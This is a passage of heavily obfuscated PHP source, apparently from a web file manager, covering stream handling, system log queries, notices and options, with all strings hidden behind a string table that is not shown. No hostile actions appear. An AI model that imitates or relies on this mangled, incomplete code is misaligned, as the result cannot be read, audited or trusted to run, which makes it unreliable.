$–×Œ©•¾ = false, $¯¿Àè×Œ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Îûáû“ş][1466])) { return parent::fileOutServer($ÑØ¶ËÒç, $ıë±¬ğ, $–×Œ©•¾, $¯¿Àè×Œ); } parent::fileOut($ÑØ¶ËÒç, $ıë±¬ğ, $–×Œ©•¾, $¯¿Àè×Œ); } public function fileOutImage($·ÉÁ¡±ø, $­Ÿ¨¢½Ê = 250) { if (strstr($this->endpoint, $_SERVER[Îûáû“ş][1466])) { return parent::fileOutImageServer($·ÉÁ¡±ø, $­Ÿ¨¢½Ê); } parent::fileOutImage($·ÉÁ¡±ø, $­Ÿ¨¢½Ê); } public function fileOutLink($¤¾‰üÁÅ) { $â¿ã²ÔÜ =& $_SERVER[Îûáû“ş]; if (substr($¤¾‰üÁÅ, 0, 7) == $â¿ã²ÔÜ[1339]) { $¤¾‰üÁÅ = $â¿ã²ÔÜ[1340] . substr($¤¾‰üÁÅ, 7); } header($â¿ã²ÔÜ[161] . $¤¾‰üÁÅ); die; } public function getHost() { $°ÃÌ„ãÌ =& $_SERVER[Îûáû“ş]; $§Ş‚ˆ = str_rtrim(parent::getHost(), $°ÃÌ„ãÌ[8] . $this->bucket); $§Ş‚ˆ = explode($°ÃÌ„ãÌ[184], $§Ş‚ˆ); return $§Ş‚ˆ[0] . $°ÃÌ„ãÌ[184] . $this->bucket . $°ÃÌ„ãÌ[10] . $§Ş‚ˆ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ùâÛÌÌî, $óäÉ•ºÖ = 0) { parent::__construct(); $this->source = $ùâÛÌÌî; $this->sourceSize = $óäÉ•ºÖ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($”÷ãıØ† = false) { return $this->sourceSize; } public function getContent($š—³ó»¥ = false) { return $this->fileSubstr($š—³ó»¥, 0, $this->sourceSize); } public function fileSubstr($›İ†¹ò¶ = false, $µÒ´”Ú = 0, $›ôâ¼– = 0) { if (!$›ôâ¼–) { $›ôâ¼– = $this->sourceSize; } $ÚìÆ°¼Û = $this->sourceSize - $µÒ´”Ú; if ($›ôâ¼– >= $ÚìÆ°¼Û) { $›ôâ¼– = $ÚìÆ°¼Û; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $µÒ´”Ú, $›ôâ¼–); } if ($this->sourceType == self::TYPE_FILE) { if ($›ôâ¼– <= 0) { return $_SERVER[Îûáû“ş][12]; } $í¹öìÃ‡ = ftell($this->source); fseek_64($this->source, $í¹öìÃ‡ + $µÒ´”Ú); $ÔŒ¸‘¾ = @fread($this->source, $›ôâ¼–); fseek_64($this->source, $í¹öìÃ‡); return $ÔŒ¸‘¾; } } public function hashMd5($Ùİ€»ôÈ = false) { return md5($this->getContent()); } public static function hash($œÇüÓá, $±ÓÃ±ìÆ = 0) { $Ìºß¤Õ = new PathDriverStream($œÇüÓá, $±ÓÃ±ìÆ); return $Ìºß¤Õ->hashSimple($œÇüÓá); } public static function md5($ª³şñÖÓ, $„Í÷ ² = 0) { $…¿üÔÄˆ = new PathDriverStream($ª³şñÖÓ, $„Í÷ ²); return $…¿üÔÄˆ->hashMd5($ª³şñÖÓ); } } goto a·ÉİçËƒ²; bîº¾Ç”‚¯: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\x65\x6d\x5f\154\x6f\147"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\124\x69\x6d\145", "\164\x69\155\x65", "\151\x6e\163\x65\x72\164", "\146\165\156\143\x74\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ÒÙüËûî =& $_SERVER[Îûáû“ş]; return array($ÒÙüËûî[2194] => LNG($ÒÙüËûî[2195]), $ÒÙüËûî[2196] => LNG($ÒÙüËûî[2197]), $ÒÙüËûî[1804] => LNG($ÒÙüËûî[2198]), $ÒÙüËûî[2199] => LNG($ÒÙüËûî[2200]), $ÒÙüËûî[2201] => LNG($ÒÙüËûî[2202]), $ÒÙüËûî[2203] => LNG($ÒÙüËûî[2204]), $ÒÙüËûî[2205] => LNG($ÒÙüËûî[2206]), $ÒÙüËûî[1834] => LNG($ÒÙüËûî[2206]), $ÒÙüËûî[1835] => LNG($ÒÙüËûî[2207]), $ÒÙüËûî[2208] => LNG($ÒÙüËûî[2209]), $ÒÙüËûî[2210] => LNG($ÒÙüËûî[2211]), $ÒÙüËûî[2212] => LNG($ÒÙüËûî[2213]), $ÒÙüËûî[2214] => LNG($ÒÙüËûî[2215]), $ÒÙüËûî[1832] => LNG($ÒÙüËûî[2216]), $ÒÙüËûî[2217] => LNG($ÒÙüËûî[2218]), $ÒÙüËûî[1839] => LNG($ÒÙüËûî[2219]), $ÒÙüËûî[2220] => LNG($ÒÙüËûî[2221]), $ÒÙüËûî[2222] => LNG($ÒÙüËûî[2223]), $ÒÙüËûî[2224] => LNG($ÒÙüËûî[2225]), $ÒÙüËûî[2226] => LNG($ÒÙüËûî[2227]), $ÒÙüËûî[1842] => LNG($ÒÙüËûî[2228]), $ÒÙüËûî[1843] => LNG($ÒÙüËûî[2229]), $ÒÙüËûî[2230] => LNG($ÒÙüËûî[2231]), $ÒÙüËûî[2232] => LNG($ÒÙüËûî[2233]), $ÒÙüËûî[2234] => LNG($ÒÙüËûî[2235]), $ÒÙüËûî[1837] => LNG($ÒÙüËûî[2236]), $ÒÙüËûî[2237] => LNG($ÒÙüËûî[2238]), $ÒÙüËûî[1836] => LNG($ÒÙüËûî[2239]), $ÒÙüËûî[2240] => LNG($ÒÙüËûî[2241]), $ÒÙüËûî[2242] => LNG($ÒÙüËûî[2243]), $ÒÙüËûî[2244] => LNG($ÒÙüËûî[2245]), $ÒÙüËûî[2246] => LNG($ÒÙüËûî[2246]), $ÒÙüËûî[2247] => LNG($ÒÙüËûî[1808]), $ÒÙüËûî[2248] => LNG($ÒÙüËûî[2249]), $ÒÙüËûî[2250] => LNG($ÒÙüËûî[2251]), $ÒÙüËûî[2252] => LNG($ÒÙüËûî[2253]), $ÒÙüËûî[2254] => LNG($ÒÙüËûî[2255]), $ÒÙüËûî[2256] => LNG($ÒÙüËûî[2257]), $ÒÙüËûî[2258] => LNG($ÒÙüËûî[2258]), $ÒÙüËûî[2259] => LNG($ÒÙüËûî[2260]), $ÒÙüËûî[2261] => LNG($ÒÙüËûî[2262]), $ÒÙüËûî[2263] => LNG($ÒÙüËûî[2264]), $ÒÙüËûî[2265] => LNG($ÒÙüËûî[2266]), $ÒÙüËûî[2267] => LNG($ÒÙüËûî[2268]), $ÒÙüËûî[2269] => LNG($ÒÙüËûî[2270])); } private function typeFile() { $‡çªçŠã =& $_SERVER[Îûáû“ş]; $è”½Âû = array($‡çªçŠã[1839] => array($‡çªçŠã[1840]), $‡çªçŠã[2212] => array($‡çªçŠã[2271]), $‡çªçŠã[2214] => array($‡çªçŠã[2272]), $‡çªçŠã[1832] => array($‡çªçŠã[1833]), $‡çªçŠã[2222] => array(), $‡çªçŠã[2224] => array(), $‡çªçŠã[2226] => array(), $‡çªçŠã[1842] => array($‡çªçŠã[1844]), $‡çªçŠã[1843] => array($‡çªçŠã[1844]), $‡çªçŠã[2230] => array($‡çªçŠã[2273]), $‡çªçŠã[2232] => array($‡çªçŠã[2273]), $‡çªçŠã[2234] => array($‡çªçŠã[2274]), $‡çªçŠã[2220] => array($‡çªçŠã[2275]), $‡çªçŠã[1837] => array($‡çªçŠã[2276]), $‡çªçŠã[2237] => array($‡çªçŠã[2277]), $‡çªçŠã[1836] => array($‡çªçŠã[1838])); return $è”½Âû; } private function typeAll() { $Òáè‚™Ö =& $_SERVER[Îûáû“ş]; $Êğ‚µÔ¥ = $this->typeList; $ûı¹Ò¦ = array_filter($this->typeFile()); foreach ($ûı¹Ò¦ as $çê¼¥Ü› => $ê¸‚…òÅ) { $Êğ‚µÔ¥[$ê¸‚…òÅ[0]] = $Êğ‚µÔ¥[$çê¼¥Ü›]; } $Êğ‚µÔ¥[$Òáè‚™Ö[1844]] = LNG($Òáè‚™Ö[2278]); $Êğ‚µÔ¥[$Òáè‚™Ö[2273]] = LNG($Òáè‚™Ö[2279]); return $Êğ‚µÔ¥; } public function addLog($î´¬¼µ, $œâû‰œƒ = array()) { $á°ÇªÃä =& $_SERVER[Îûáû“ş]; if (!isset($this->typeList[$î´¬¼µ])) { return; } $úëÔ½¬ß = USER_ID ? USER_ID : (isset($œâû‰œƒ[$á°ÇªÃä[1670]]) ? $œâû‰œƒ[$á°ÇªÃä[1670]] : 0); if (!$úëÔ½¬ß) { $úëÔ½¬ß = (int) Session::get($á°ÇªÃä[1998]); } if ($î´¬¼µ == $á°ÇªÃä[2248] && is_array($œâû‰œƒ[$á°ÇªÃä[2280]]) && !$œâû‰œƒ[$á°ÇªÃä[2280]]) { return; } $åÏÙ£¨ = get_client_ip(); if (!$œâû‰œƒ || strlen(json_encode($œâû‰œƒ)) >= 1024) { $œâû‰œƒ = array($á°ÇªÃä[2281] => $åÏÙ£¨); } else { if (is_array($œâû‰œƒ)) { $œâû‰œƒ[$á°ÇªÃä[2281]] = $åÏÙ£¨; } else { $œâû‰œƒ = array($á°ÇªÃä[1204] => $œâû‰œƒ, $á°ÇªÃä[2281] => $åÏÙ£¨); } } $œâû‰œƒ = array($á°ÇªÃä[1660] => Session::sign(), $á°ÇªÃä[1661] => $úëÔ½¬ß, $á°ÇªÃä[33] => $î´¬¼µ, $á°ÇªÃä[1663] => json_encode($œâû‰œƒ)); parent::add($œâû‰œƒ); } public function remove($ëÈğ£¬÷) { $this->where(array($_SERVER[Îûáû“ş][419] => $ëÈğ£¬÷))->delete(); } private function _makeOrder($è¢üõ€Ï = '') { $ªœæ „° =& $_SERVER[Îûáû“ş]; $úŒ—‰­ƒ = $ªœæ „°[201]; $¤¿ëê»º = array($ªœæ „°[450] => $ªœæ „°[451], $ªœæ „°[452] => $ªœæ „°[453]); $›Ë™‚õâ = Input::get($ªœæ „°[458], $ªœæ „°[7], $ªœæ „°[2034], array($ªœæ „°[1952], $ªœæ „°[452])); $›Ë™‚õâ = $¤¿ëê»º[$›Ë™‚õâ]; $è¢üõ€Ï = $è¢üõ€Ï . "{$úŒ—‰­ƒ}\40{$›Ë™‚õâ}"; return $this->order($è¢üõ€Ï); } public function get($ÛÄ‚¸¡ = '') { $¯•€éçŒ =& $_SERVER[Îûáû“ş]; if (!$ÛÄ‚¸¡) { show_json(array()); } $ñ—‡ Ë = array(); if ($ÛÄ‚¸¡[$¯•€éçŒ[1670]]) { $ñ—‡ Ë[$¯•€éçŒ[1670]] = $ÛÄ‚¸¡[$¯•€éçŒ[1670]]; } if (isset($ÛÄ‚¸¡[$¯•€éçŒ[759]])) { $î²ã‡«à = $ÛÄ‚¸¡[$¯•€éçŒ[759]]; $˜µ“›»‡ = isset($ÛÄ‚¸¡[$¯•€éçŒ[760]]) ? $ÛÄ‚¸¡[$¯•€éçŒ[760]] : time(); $ñ—‡ Ë[$¯•€éçŒ[201]] = array($¯•€éçŒ[333], array($î²ã‡«à, $˜µ“›»‡)); } if ($ÛÄ‚¸¡[$¯•€éçŒ[33]]) { $ ÷Éğßö = explode($¯•€éçŒ[50], $ÛÄ‚¸¡[$¯•€éçŒ[33]]); $šš¬Ğ£à = $this->typeFile(); $ˆÏ™®Ë÷ = array(); foreach ($ ÷Éğßö as $–°Àâ€Ÿ) { $ˆÏ™®Ë÷[] = $–°Àâ€Ÿ; if (isset($šš¬Ğ£à[$–°Àâ€Ÿ])) { $ˆÏ™®Ë÷ = array_merge($ˆÏ™®Ë÷, $šš¬Ğ£à[$–°Àâ€Ÿ]); } } $ˆÏ™®Ë÷ = array_unique($ˆÏ™®Ë÷); if ($ˆÏ™®Ë÷) { $ñ—‡ Ë[$¯•€éçŒ[33]] = array($¯•€éçŒ[7], $ˆÏ™®Ë÷); } } else { $ñ—‡ Ë[$¯•€éçŒ[33]] = array($¯•€éçŒ[2282], $¯•€éçŒ[2283]); } if (!empty($ÛÄ‚¸¡[$¯•€éçŒ[2281]])) { $ñ—‡ Ë[$¯•€éçŒ[453]] = array($¯•€éçŒ[383], "\x25{$ÛÄ‚¸¡[$¯•€éçŒ[2281]]}\45"); } $Í°®«˜ = $this->_makeOrder()->where($ñ—‡ Ë)->selectPage(); if (empty($Í°®«˜[$¯•€éçŒ[369]])) { show_json(array(), !0, $Í°®«˜[$¯•€éçŒ[366]]); } $Í°®«˜[$¯•€éçŒ[369]] = $this->logList($Í°®«˜[$¯•€éçŒ[369]]); return $Í°®«˜; } private function ipAddress(&$’Şæ‘ö) { $Ê¨‡¿ö¹ =& $_SERVER[Îûáû“ş]; if (!empty($’Şæ‘ö[$Ê¨‡¿ö¹[2281]])) { $ò…»Ó¤© = IpLocation::get($’Şæ‘ö[$Ê¨‡¿ö¹[2281]]); } else { $ò…»Ó¤© = LNG($Ê¨‡¿ö¹[2284]); } $’Şæ‘ö[$Ê¨‡¿ö¹[2285]] = $ò…»Ó¤©; } private function descZipDownload($»êËù»Ä, &$ÊÒ˜¡Š¾) { $ó‹ñüÊ =& $_SERVER[Îûáû“ş]; if (!isset($»êËù»Ä[$ó‹ñüÊ[2286]])) { return; } $”Ç­Àİ§ = json_decode($»êËù»Ä[$ó‹ñüÊ[2286]], !0); foreach ($”Ç­Àİ§ as $’õ®çÖÓ) { try { $—½†‹® = IO::infoFull($’õ®çÖÓ[$ó‹ñüÊ[84]]); } catch (Exception $ê™¦— ì) { continue; } $»êËù»Ä[$ó‹ñüÊ[84]] = $’õ®çÖÓ[$ó‹ñüÊ[84]]; $ÊÒ˜¡Š¾[] = $»êËù»Ä[$ó‹ñüÊ[402]] = $—½†‹®[$ó‹ñüÊ[402]]; $ÊÒ˜¡Š¾[] = $»êËù»Ä[$ó‹ñüÊ[2088]] = $—½†‹®[$ó‹ñüÊ[432]]; break; } return $»êËù»Ä; } private function getSourceList(&$÷– ğœ˜) { $’ ®œè£ =& $_SERVER[Îûáû“ş]; $ğÂçÚ Ú = array(); foreach ($÷– ğœ˜ as $ŸıîÙ‚÷ => $¼ìÜ©Ş†) { $´ÍÔ‘ÇÖ = json_decode($¼ìÜ©Ş†[$’ ®œè£[453]], !0); if ($¼ìÜ©Ş†[$’ ®œè£[33]] == $’ ®œè£[1835]) { $´ÍÔ‘ÇÖ = $this->descZipDownload($´ÍÔ‘ÇÖ, $ğÂçÚ Ú); $÷– ğœ˜[$ŸıîÙ‚÷][$’ ®œè£[453]] = json_encode($´ÍÔ‘ÇÖ); continue; } if (strpos($¼ìÜ©Ş†[$’ ®œè£[33]], $’ ®œè£[2090]) !== 0) { if (!isset($´ÍÔ‘ÇÖ[$’ ®œè£[84]]) || strpos($¼ìÜ©Ş†[$’ ®œè£[33]], $’ ®œè£[2287]) !== 0) { continue; } try { $òÛª ¹£ = IO::infoFull($´ÍÔ‘ÇÖ[$’ ®œè£[84]]); } catch (Exception $¢ØŒºü) { continue; } $ğÂçÚ Ú[] = $´ÍÔ‘ÇÖ[$’ ®œè£[402]] = $òÛª ¹£[$’ ®œè£[402]]; $ğÂçÚ Ú[] = $´ÍÔ‘ÇÖ[$’ ®œè£[2088]] = $òÛª ¹£[$’ ®œè£[432]]; $÷– ğœ˜[$ŸıîÙ‚÷][$’ ®œè£[453]] = json_encode($´ÍÔ‘ÇÖ); continue; } $ğÂçÚ Ú[] = $´ÍÔ‘ÇÖ[$’ ®œè£[402]]; $ğÂçÚ Ú[] = $´ÍÔ‘ÇÖ[$’ ®œè£[2088]]; if ($´ÍÔ‘ÇÖ[$’ ®œè£[33]] == $’ ®œè£[548]) { $ğÂçÚ Ú[] = $´ÍÔ‘ÇÖ[$’ ®œè£[453]][$’ ®œè£[1162]]; $ğÂçÚ Ú[] = $´ÍÔ‘ÇÖ[$’ ®œè£[453]][$’ ®œè£[1163]]; } if ($´ÍÔ‘ÇÖ[$’ ®œè£[33]] == $’ ®œè£[2098]) { $ğÂçÚ Ú[] = $´ÍÔ‘ÇÖ[$’ ®œè£[453]][$’ ®œè£[402]]; } } if (!$ğÂçÚ Ú) { return array(); } return Model($’ ®œè£[824])->sourceListInfo($ğÂçÚ Ú, !0); } private function logList($í„³—İ×) { $Œ·¥¤Ü˜ =& $_SERVER[Îûáû“ş]; $ªşÜ¨àÒ = array_to_keyvalue($í„³—İ×, $Œ·¥¤Ü˜[12], $Œ·¥¤Ü˜[1670]); $ÖÍÃ›í = Model($Œ·¥¤Ü˜[525])->userListInfo(array_unique($ªşÜ¨àÒ)); $Š€‡»È˜ = $this->getSourceList($í„³—İ×); $ñ«Æİß³ = $this->typeAll(); $ÎÁö£°¨ = array(); $ú¤´§˜Ñ = array(); foreach ($í„³—İ× as $ı·²î„ã => $ÍøÊ†şè) { $™¡ÇÄ’„ = $ÍøÊ†şè[$Œ·¥¤Ü˜[33]]; $’¼ Ä™ = isset($ÖÍÃ›í[$ÍøÊ†şè[$Œ·¥¤Ü˜[1670]]]) ? $ÖÍÃ›í[$ÍøÊ†şè[$Œ·¥¤Ü˜[1670]]] : !1; $İñİÚŞ° = strpos($™¡ÇÄ’„, $Œ·¥¤Ü˜[2288]) === 0 ? LNG($Œ·¥¤Ü˜[2289]) : LNG($Œ·¥¤Ü˜[2284]); $ÍøÊ†şè[$Œ·¥¤Ü˜[32]] = isset($’¼ Ä™[$Œ·¥¤Ü˜[32]]) ? $’¼ Ä™[$Œ·¥¤Ü˜[32]] : LNG($Œ·¥¤Ü˜[2284]); $ÍøÊ†şè[$Œ·¥¤Ü˜[532]] = isset($’¼ Ä™[$Œ·¥¤Ü˜[532]]) ? $’¼ Ä™[$Œ·¥¤Ü˜[532]] : $Œ·¥¤Ü˜[12]; $ÍøÊ†şè[$Œ·¥¤Ü˜[1570]] = isset($ñ«Æİß³[$™¡ÇÄ’„]) ? $ñ«Æİß³[$™¡ÇÄ’„] : $İñİÚŞ°; $ÍøÊ†şè[$Œ·¥¤Ü˜[2033]] = $’¼ Ä™; $è“Šæº‘ = json_decode($ÍøÊ†şè[$Œ·¥¤Ü˜[453]], !0); $ÍøÊ†şè[$Œ·¥¤Ü˜[2281]] = isset($è“Šæº‘[$Œ·¥¤Ü˜[2281]]) ? $è“Šæº‘[$Œ·¥¤Ü˜[2281]] : $Œ·¥¤Ü˜[12]; $ÍøÊ†şè[$Œ·¥¤Ü˜[2285]] = IpLocation::get($ÍøÊ†şè[$Œ·¥¤Ü˜[2281]]); if (strpos($™¡ÇÄ’„, $Œ·¥¤Ü˜[2090]) === 0 || isset($è“Šæº‘[$Œ·¥¤Ü˜[2088]])) { $è“Šæº‘[$Œ·¥¤Ü˜[87]] = $Š€‡»È˜[$è“Šæº‘[$Œ·¥¤Ü˜[402]]]; $è“Šæº‘[$Œ·¥¤Ü˜[2103]] = $Š€‡»È˜[$è“Šæº‘[$Œ·¥¤Ü˜[2088]]]; if ($è“Šæº‘[$Œ·¥¤Ü˜[33]] == $Œ·¥¤Ü˜[548]) { $è“Šæº‘[$Œ·¥¤Ü˜[453]][$Œ·¥¤Ü˜[1162]] = $Š€‡»È˜[$è“Šæº‘[$Œ·¥¤Ü˜[453]][$Œ·¥¤Ü˜[1162]]]; $è“Šæº‘[$Œ·¥¤Ü˜[453]][$Œ·¥¤Ü˜[1163]] = $Š€‡»È˜[$è“Šæº‘[$Œ·¥¤Ü˜[453]][$Œ·¥¤Ü˜[1163]]]; } if ($è“Šæº‘[$Œ·¥¤Ü˜[33]] == $Œ·¥¤Ü˜[2098]) { $è“Šæº‘[$Œ·¥¤Ü˜[453]][$Œ·¥¤Ü˜[402]] = $Š€‡»È˜[$è“Šæº‘[$Œ·¥¤Ü˜[453]][$Œ·¥¤Ü˜[402]]]; } if ($è“Šæº‘[$Œ·¥¤Ü˜[33]] == $Œ·¥¤Ü˜[1830]) { $è“Šæº‘[$Œ·¥¤Ü˜[2103]] = $è“Šæº‘[$Œ·¥¤Ü˜[87]]; $è“Šæº‘[$Œ·¥¤Ü˜[2088]] = $è“Šæº‘[$Œ·¥¤Ü˜[2103]][$Œ·¥¤Ü˜[402]]; $è“Šæº‘[$Œ·¥¤Ü˜[87]] = !1; $è“Šæº‘[$Œ·¥¤Ü˜[402]] = $Œ·¥¤Ü˜[12]; } if ($è“Šæº‘[$Œ·¥¤Ü˜[87]] && $è“Šæº‘[$Œ·¥¤Ü˜[87]][$Œ·¥¤Ü˜[411]] == $Œ·¥¤Ü˜[1286]) { $ú¤´§˜Ñ[] = $ÍøÊ†şè[$Œ·¥¤Ü˜[399]]; unset($í„³—İ×[$ı·²î„ã]); continue; } if ($è“Šæº‘[$Œ·¥¤Ü˜[2103]] && $è“Šæº‘[$Œ·¥¤Ü˜[2103]][$Œ·¥¤Ü˜[411]] == $Œ·¥¤Ü˜[1286]) { $ú¤´§˜Ñ[] = $ÍøÊ†şè[$Œ·¥¤Ü˜[399]]; unset($í„³—İ×[$ı·²î„ã]); continue; } } $ÍøÊ†şè[$Œ·¥¤Ü˜[453]] = $è“Šæº‘; unset($ÍøÊ†şè[$Œ·¥¤Ü˜[2290]]); $ÎÁö£°¨[] = $ÍøÊ†şè; } $this->clearSystemPathLog($ú¤´§˜Ñ); return $ÎÁö£°¨; } private function clearSystemPathLog($¼“¼å“) { $Àˆ˜‰í™ =& $_SERVER[Îûáû“ş]; if (count($¼“¼å“) == 0) { return; } $ÔÑı²¿Ğ = array($Àˆ˜‰í™[399] => array($Àˆ˜‰í™[7], array_unique($¼“¼å“))); $this->where($ÔÑı²¿Ğ)->delete(); } public function deviceList($Ø€í±Éˆ, $½ÕØ¹É = 0) { $Ø—ÌÁ†Í =& $_SERVER[Îûáû“ş]; $Ò …›‹Ô = array($Ø—ÌÁ†Í[1670] => $Ø€í±Éˆ, $Ø—ÌÁ†Í[201] => array($Ø—ÌÁ†Í[1016], $½ÕØ¹É), $Ø—ÌÁ†Í[33] => $Ø—ÌÁ†Í[1804]); $ÛÍğèóæ = array(); $å¹‘šÄ = $this->field($Ø—ÌÁ†Í[2291])->where($Ò …›‹Ô)->order($Ø—ÌÁ†Í[2101])->limit(50)->select(); foreach ($å¹‘šÄ as $·´ ãô => $ı³è¬™İ) { if ($·´ ãô > 0 && abs($ı³è¬™İ[$Ø—ÌÁ†Í[201]] - $å¹‘šÄ[$·´ ãô - 1][$Ø—ÌÁ†Í[201]]) < 5) { continue; } $Š¶òÅ‰ = json_decode($ı³è¬™İ[$Ø—ÌÁ†Í[453]], !0); $ı³è¬™İ[$Ø—ÌÁ†Í[2281]] = isset($Š¶òÅ‰[$Ø—ÌÁ†Í[2281]]) ? $Š¶òÅ‰[$Ø—ÌÁ†Í[2281]] : $Ø—ÌÁ†Í[12]; unset($Š¶òÅ‰[$Ø—ÌÁ†Í[2281]]); $øÅÅşƒˆ = $this->deviceType($Š¶òÅ‰[$Ø—ÌÁ†Í[2091]]); if (isset($ÛÍğèóæ[$øÅÅşƒˆ])) { continue; } $ı³è¬™İ[$Ø—ÌÁ†Í[2285]] = IpLocation::get($ı³è¬™İ[$Ø—ÌÁ†Í[2281]]); $ı³è¬™İ[$Ø—ÌÁ†Í[453]] = $Š¶òÅ‰; $ÛÍğèóæ[$øÅÅşƒˆ] = $ı³è¬™İ; } return array_values($ÛÍğèóæ); } public function deviceType($ºÈÁ²Á) { return $ºÈÁ²Á; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\x2e\x6e\x6f\164\x69\x63\x65\114\151\163\x74"; public $field = array("\156\x61\155\x65", "\143\157\156\x74\145\x6e\x74", "\x61\165\164\150", "\155\157\x64\145", "\x74\x69\x6d\145", "\x74\x79\x70\x65", "\x6c\145\x76\145\x6c", "\x65\156\141\142\x6c\x65", "\x73\x6f\x72\x74"); public function listData($ˆÅÒ…¤ó = false, $üÈ§¡”… = "\x73\157\x72\164", $åÖñ› = false) { return parent::listData($ˆÅÒ…¤ó, $üÈ§¡”…, $åÖñ›); } public function add($ù éÎªª) { $Œè´ËÉü =& $_SERVER[Îûáû“ş]; $ªøŸı™¤ = time(); if ($ù éÎªª[$Œè´ËÉü[16]] == $Œè´ËÉü[2292]) { $ªøŸı™¤ = strtotime($ù éÎªª[$Œè´ËÉü[180]]); } $ù éÎªª[$Œè´ËÉü[180]] = $ªøŸı™¤; return parent::insert($ù éÎªª); } public function update($»Öû¸ï–, $Ï°ÆÔšü) { $ÈÄ×Øø× =& $_SERVER[Îûáû“ş]; $’ÆØÄÁÉ = $this->listData($»Öû¸ï–); if (!$’ÆØÄÁÉ) { return !1; } $ˆ³¥²Š = time(); if ($Ï°ÆÔšü[$ÈÄ×Øø×[16]] == $ÈÄ×Øø×[2292]) { $ˆ³¥²Š = strtotime($Ï°ÆÔšü[$ÈÄ×Øø×[180]]); } $Ï°ÆÔšü[$ÈÄ×Øø×[180]] = $ˆ³¥²Š; return parent::update($»Öû¸ï–, $Ï°ÆÔšü); } public function remove($åûİö‡ú) { $µŸŞóÈ“ = $this->listData($åûİö‡ú); if (!$µŸŞóÈ“ || $µŸŞóÈ“[$_SERVER[Îûáû“ş][1286]]) { return !1; } return parent::remove($åûİö‡ú); } public function sort($Ö¸¤ØèÜ, $ŸÂ“É±) { return parent::update($Ö¸¤ØèÜ, $ŸÂ“É±); } public function enable($¶Çú®é, $üŠîÑÏÑ) { return parent::update($¶Çú®é, array($_SERVER[Îûáû“ş][2293] => $üŠîÑÏÑ)); } private function initUserOption() { $é®Üµ¨Ñ =& $_SERVER[Îûáû“ş]; $this->optionType = $é®Üµ¨Ñ[2294]; $this->modelType = $é®Üµ¨Ñ[2295]; $this->field = array($é®Üµ¨Ñ[2296], $é®Üµ¨Ñ[32], $é®Üµ¨Ñ[180], $é®Üµ¨Ñ[33], $é®Üµ¨Ñ[2297], $é®Üµ¨Ñ[748], $é®Üµ¨Ñ[196]); } public function userNoticeGet($¦š“È¥Á = false) { $this->initUserOption(); return parent::listData($¦š“È¥Á, $_SERVER[Îûáû“ş][399], !0); } public function userNoticeAdd($ô’¨ãõ™) { $˜Æ‘µÅ =& $_SERVER[Îûáû“ş]; $this->initUserOption(); $ŠùŸŒá´ = $this->findByKey($˜Æ‘µÅ[2296], $ô’¨ãõ™[$˜Æ‘µÅ[399]]); if ($ŠùŸŒá´) { return !0; } $şŞÖà‡… = array($˜Æ‘µÅ[2296] => $ô’¨ãõ™[$˜Æ‘µÅ[399]], $˜Æ‘µÅ[32] => $ô’¨ãõ™[$˜Æ‘µÅ[32]], $˜Æ‘µÅ[180] => $ô’¨ãõ™[$˜Æ‘µÅ[180]], $˜Æ‘µÅ[33] => isset($ô’¨ãõ™[$˜Æ‘µÅ[33]]) ? $ô’¨ãõ™[$˜Æ‘µÅ[33]] : 1, $˜Æ‘µÅ[2297] => isset($ô’¨ãõ™[$˜Æ‘µÅ[2297]]) ? $ô’¨ãõ™[$˜Æ‘µÅ[2297]] : 0, $˜Æ‘µÅ[748] => 0, $˜Æ‘µÅ[196] => 0); return parent::insert($şŞÖà‡…); } public function userNoticeEdit($Û¢¥, $¤–˜Œü¯) { $this->initUserOption(); return parent::update($Û¢¥, $¤–˜Œü¯); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\x65\x6d\137\157\160\x74\151\x6f\x6e"; protected $jsonField = array("\x6d\145\156\x75", "\162\157\x6c\x65", "\x72\157\154\145\x47\162\157\x75\x70", "\162\x65\x67\151\163\x74", "\x65\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($¬²¿»ú) { return "\x53\x79\163\x74\x65\x6d\117\x70\164\151\157\156\x5f{$¬²¿»ú}"; } protected function optionDefault($ï¹ëòÒé = '') { $‚ùäÊ¹ =& $_SERVER[Îûáû“ş]; if ($ï¹ëòÒé == $‚ùäÊ¹[12]) { return $GLOBALS[$‚ùäÊ¹[6]][$‚ùäÊ¹[381]]; } } } goto fÇ‰…ÉÍË™; c²Å¯¾‘¾Ê: function binCheckBigger($ËÎ¶Î“ş, $ˆùÃ ÌÏ) { return $ËÎ¶Î“ş > $ˆùÃ ÌÏ; } $_SERVER[$_SERVER[Ä­ñÛ£Ä][3]] = (base64_decode('ODE5Mg==')."\62\71")+0;$_pyqx="sdvq9omt07ixaypnzkc58ghuj34er6wb2fl1obkv90xuqaw6gfjthy2s14c83np7rzlmied";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ØŠò­, $˜òÑĞª) { $€¯ÇØÍó =& $_SERVER[Îûáû“ş]; if (isset(self::$_methodList[$ØŠò­])) { return @call_user_func_array(self::$_methodList[$ØŠò­], $˜òÑĞª); } else { if (method_exists($this, $ØŠò­)) { return call_user_func_array(array($this, $ØŠò­), $˜òÑĞª); } else { think_exception(__CLASS__ . $€¯ÇØÍó[4] . $ØŠò­ . $€¯ÇØÍó[5]); } } } public static function __callStatic($ìŸ¬¶Åè, $à÷Œ ™ƒ) { if (isset(self::$_methodListStatic[$ìŸ¬¶Åè])) { return call_user_func_array(self::$_methodListStatic[$ìŸ¬¶Åè], $à÷Œ ™ƒ); } else { if (method_exists(self, $ìŸ¬¶Åè)) { return call_user_func_array(array(self, $ìŸ¬¶Åè), $à÷Œ ™ƒ); } else { show_json("{$ìŸ¬¶Åè}\x28\51\40\156\x6f\x74\x20\x65\170\151\163\164\73", !1); } } } public static function addMethod($»‹•áÆ„, $º¨šŸĞ¼) { self::$_methodList[$»‹•áÆ„] = $º¨šŸĞ¼; } public static function addMethodStatic($æè¬ØæÖ, $¶Âà¨èş) { self::$_methodListStatic[$æè¬ØæÖ] = 